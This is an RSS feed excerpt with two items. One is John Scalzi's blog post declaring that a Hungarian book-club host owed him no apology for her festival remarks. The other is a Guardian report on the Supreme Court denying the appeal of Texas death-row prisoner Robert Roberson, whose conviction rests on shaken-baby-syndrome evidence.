<figure><img decoding="async" width="225" height="338" data-attachment-id="48641" data-permalink="https://whatever.scalzi.com/2023/08/09/post-mortem-on-ohio-issue-1/whsjohns2/" data-orig-file="https://i0.wp.com/whatever.scalzi.com/wp-content/uploads/2023/08/WHSJohnS2.jpg?fit=225%2C338&amp;ssl=1" data-orig-size="225,338" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="WHSJohnS2" data-image-description="" data-image-caption="" data-medium-file="https://i0.wp.com/whatever.scalzi.com/wp-content/uploads/2023/08/WHSJohnS2.jpg?fit=200%2C300&amp;ssl=1" data-large-file="https://i0.wp.com/whatever.scalzi.com/wp-content/uploads/2023/08/WHSJohnS2.jpg?fit=225%2C338&amp;ssl=1" src="https://i0.wp.com/whatever.scalzi.com/wp-content/uploads/2023/08/WHSJohnS2.jpg?resize=225%2C338&amp;ssl=1" alt="" srcset="https://i0.wp.com/whatever.scalzi.com/wp-content/uploads/2023/08/WHSJohnS2.jpg?w=225&amp;ssl=1 225w, https://i0.wp.com/whatever.scalzi.com/wp-content/uploads/2023/08/WHSJohnS2.jpg?resize=200%2C300&amp;ssl=1 200w" sizes="(max-width: 225px) 100vw, 225px" data-recalc-dims="1"></figure></div>


<p><strong>So, at the opening ceremonies of the Budapest International Book Festival this year,</strong> a couple of people gave prefatory remarks before I received the Budapest Grand Prize and participated in my own relatively brief question and answer period. One of them was actor Ervin Nagy; the other was Ági Szabados, who is a newscaster and bookseller who runs a nationwide book club in Hungary (think along the lines of the Oprah Book Club or the Reese Witherspoon book club). At the time of the event, I listened to her remarks (via a translator) and thought them perfectly uncontroversial; among other things she talked about the importance of reading, which is, rather obviously, something I agree with.</p>



<p>Apparently I was one of the few who found the remarks uncontroversial, because shortly thereafter Ms. Szabados was sharply criticized for her remarks in the press and online, and was accused, more or less, of making her speech about herself and not about me, who was the putative subject under discussion. This caused enough of an uproar in Hungary that <a href="https://24.hu/elet-stilus/2023/10/02/szabados-agi-elnezest-kert-john-scalzi-laudacio-beszed-meltatas-budapesti-nemzetkozi-konyvfesztival-2023/">Ms. Szabados felt obliged to offer an apology for her speech</a>, and in particular noted that she hoped that I had not been offended.</p>



<p>With that as preamble, and with the further notation that no one in Hungary, and certainly not Ms. Szabados, has asked me to say anything about this or, indeed, even <em>knows </em>that I am about to say anything about this:</p>



<p>Folks, I was not offended at the time, nor am I offended now. And while I appreciate that Ms. Szabados has offered an apology generally, and also to me specifically, in my particular case, I don’t think an apology was needed. Again, I found nothing objectionable in her comments to the opening ceremony audience. I suppose she could have talked about me more, but then, <em>I</em> was there to talk about me, and <em>did</em>, for about 20 minutes at the opening ceremony, and then for over an hour at my own spotlight event two days later. I dare say that no one who attended the book festival came away lacking information on the topic of John Scalzi. I assure you, I am very good at talking about me. Ask literally anyone who has ever met me. </p>



<p>Ms. Szabados otherwise talked about reading, and the importance of taking the time to read, and, well, I have no problem with that. As I understand it, the name of her book club translates in English to “No Time To Read,” and the title of the book club rather puts a point on the matter: People are often of the opinion that they don’t have time. To the extent that Ms. Szabados encourages people to find the time to read, I appreciate her efforts. And the fact that she chose the Hungarian translation of <em>Old Man’s War</em> as her club’s September read, in advance of my arrival at the book festival, was of actual benefit to me: She introduced me and my work to a whole bunch of readers who might not otherwise have ever checked out my novel. This is not just supposition; several people at the festival who came to see me told me that her book club was how they found out about me. Some of them were clutching copies of <em>other </em>books of mine as they did so. </p>



<p>Which is to say that from my point of view, long before Ms. Szabados stepped onto the stage last Thursday, she had <em>already </em>done more to introduce me to new readers in Hungary, and to spur conversation about my work, than almost any other single person in in the country, short of my actual publisher, and the organizers of the book festival. So not only does she have nothing to apologize to me for, at the end of the day the emotion I most feel regarding Ms. Szabados is: gratitude. She did a very good thing for me, and the introduction she made at the opening ceremonies — where she talked about the book club that introduced me to many readers! — was only the smallest part of all of that.  </p>



<p>Now, I realize that there’s probably more going on here. I am not privy to all the social undercurrents in Hungary that flow beneath this particular story. I can only comment on what I know and my own perspective on it as an outsider. Additionally, I don’t know Ms. Szabados in any meaningful way; we were introduced briefly prior to the opening ceremonies, and saw each other again a couple days later, where again we chatted briefly and took a picture before we both went to do our respective things. In the very brief time I had with her, she seemed lovely. I was glad to meet her.</p>



<p>So, please. People of Hungary, if you are angry or annoyed at Ms. Szabados on my behalf, thank you, but don’t be. Don’t take on a burden that I myself do not carry. I appreciate what Ms. Szabados did for me, at the festival and before it. No apology is necessary for any of it. Not to me, and, may I suggest, not to anyone else.</p>



<p>— JS</p>



<p>(Photo of Ms. Szabados taken from <a href="https://www.instagram.com/nincsidomolvasnikihivas/">here</a>) </p>

	
	<!-- BEGIN .postmeta -->
	

	<!-- .post-navigation -->

	
<!-- #comments -->

	

	
<!-- END .postarea -->
</div></div>]]></description>
        </item>
        <item>
            <title><![CDATA[Texas man sent to death row over junk science denied US Supreme Court appeal (256 pts)]]></title>
            <link>https://www.theguardian.com/us-news/2023/oct/02/texas-robert-roberson-death-penalty-supreme-court-appeal-denied</link>
            <guid>37748408</guid>
            <pubDate>Tue, 03 Oct 2023 05:59:15 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://www.theguardian.com/us-news/2023/oct/02/texas-robert-roberson-death-penalty-supreme-court-appeal-denied">https://www.theguardian.com/us-news/2023/oct/02/texas-robert-roberson-death-penalty-supreme-court-appeal-denied</a>, See on <a href="https://news.ycombinator.com/item?id=37748408">Hacker News</a></p>
<div id="readability-page-1" class="page"><div id="maincontent"><p>A <a href="https://www.theguardian.com/us-news/texas" data-link-name="in body link" data-component="auto-linked-tag">Texas</a> prisoner who is facing execution having been sent to death row on the basis of “shaken baby syndrome”, a child abuse theory that has been widely debunked as junk science, has had his petition to the US supreme court denied.</p><figure id="2dd7551d-4ee6-4c8e-a606-026c0845ccb4" data-spacefinder-role="richLink" data-spacefinder-type="model.dotcomrendering.pageElements.RichLinkBlockElement"><gu-island name="RichLinkComponent" deferuntil="idle" props="{&quot;richLinkIndex&quot;:1,&quot;element&quot;:{&quot;_type&quot;:&quot;model.dotcomrendering.pageElements.RichLinkBlockElement&quot;,&quot;url&quot;:&quot;https://www.theguardian.com/world/2023/sep/24/texas-death-row-robert-roberson-supreme-court-shaken-baby-syndrome&quot;,&quot;text&quot;:&quot;Texas death row inmate at mercy of supreme court – and junk science&quot;,&quot;prefix&quot;:&quot;Related: &quot;,&quot;role&quot;:&quot;richLink&quot;,&quot;elementId&quot;:&quot;2dd7551d-4ee6-4c8e-a606-026c0845ccb4&quot;},&quot;ajaxUrl&quot;:&quot;https://api.nextgen.guardianapps.co.uk&quot;,&quot;format&quot;:{&quot;display&quot;:0,&quot;theme&quot;:0,&quot;design&quot;:0}}" config="{&quot;renderingTarget&quot;:&quot;Web&quot;}"></gu-island></figure><p>The country’s highest court issued <a href="https://www.supremecourt.gov/orders/courtorders/100223zor_5368.pdf" data-link-name="in body link">its denial</a> on Monday morning giving no explanation. Robert Roberson, 56, who was sent to death row in 2003 for shaking his two-year-old daughter Nikki to death, had appealed to the justices to take another look at his case focusing on the <a href="https://www.theguardian.com/world/2023/sep/24/texas-death-row-robert-roberson-supreme-court-shaken-baby-syndrome" data-link-name="in body link">largely discredited forensic science</a> on which his conviction was secured.</p><p>The court’s decision leaves Roberson’s life in jeopardy. Having come within four days of execution in 2016, he has already exhausted appeals through Texas state courts and must now rely on the mercy of the Republican governor Greg Abbott who rarely grants clemency.</p><p>“Robert Roberson is an innocent father who has languished on Texas’s death row for 20 years for a crime that never occurred and a conviction based on outdated and now refuted science,” the prisoner’s lawyer, Gretchen Sween, said.</p><p>Sween added: “To lose a child is unimaginable. To be falsely convicted of harming that child is the stuff of nightmares.”</p><p>Nikki died in hospital on 1 February 2002 after she fell into a comatose state in Roberson’s home in Palestine, Texas. Pediatric doctors detected symptoms including brain swelling which at the time were considered to be certain proof of child abuse and violent shaking.</p><p>Largely on the basis of that evidence, Roberson was sentenced to death.</p><p>In the intervening years, however, new evidence has been uncovered that suggests that not only is Roberson potentially innocent but that the crime for which he was convicted of never took place. Leading scientists have questioned the reliability of shaken baby syndrome, both as a medical diagnosis and as a forensic tool in criminal prosecutions, pointing to more than 80 alternative causes that can explain the symptoms without violence having occurred.</p><p>At least 32 people have been exonerated for crimes based on shaken baby syndrome forensics. Last month, an <a href="https://www.documentcloud.org/documents/23986841-20230913-decision-affirming-preclusion" data-link-name="in body link">appeals court</a> in New Jersey ruled that the theory was “junk science” and “scientifically unreliable”.</p><p>In Nikki’s case, several of the alternative causes that scientists have identified for the symptoms linked to shaken baby syndrome have been found to apply to the toddler. The girl had been ill with a fever of 104.5F (40.3C) shortly before she collapsed, had undiagnosed pneumonia, and had been given medical pills that are no longer considered safe for children as they can be life-threatening.</p><figure data-spacefinder-role="inline" data-spacefinder-type="model.dotcomrendering.pageElements.NewsletterSignupBlockElement"><a data-ignore="global-link-styling" href="#EmailSignup-skip-link-11">skip past newsletter promotion</a><p id="EmailSignup-skip-link-11" tabindex="0" aria-label="after newsletter promotion" role="note">after newsletter promotion</p></figure><p>At his 2003 trial, Roberson was portrayed by prosecutors as a cold and calculating father who displayed no emotion. After his conviction, though, the inmate was diagnosed with autism which put those qualities in a completely different light.</p><p>Amid mounting concern around the reliability of Roberson’s conviction, prominent individuals have called for a rethink before a possibly innocent man is executed. They include five retired federal judges and 16 current and retired forensic scientists and pediatric doctors.</p><p>The police detective who led the investigation into Nikki’s death has also developed such serious doubts about the reliability of the evidence that he has called for a review of the case. Brian Wharton, who testified for the prosecution at the 2003 trial, told the Guardian that he was “deeply saddened” by the supreme court’s decision not to take the petition.</p><p>Wharton said that when he heard that the justices had turned Roberson down, he thought of the words above the courthouse: equal justice under the law. “Those words are just a bumper sticker, they’re just jargon. We hold those ideals up, but in this case rather than seeking justice it seems like the system is going out of its way to resist it.”</p></div></div>]]></description>
        </item>
    </channel>
</rss>